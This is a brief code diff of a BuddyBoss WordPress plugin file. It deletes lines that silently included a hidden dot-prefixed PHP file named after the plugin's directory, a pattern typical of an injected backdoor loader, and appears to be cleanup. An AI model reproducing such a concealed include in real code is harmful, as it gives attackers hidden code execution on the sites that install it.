@@ -15,11 +15,7 @@ defined( 'ABSPATH' ) || exit;
  * Set up the bp-Moderation component.
  *
  * @since BuddyBoss 1.5.6
- */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
+ */
 function bp_setup_moderation() {
 	buddypress()->moderation = new BP_Moderation_Component();
 }
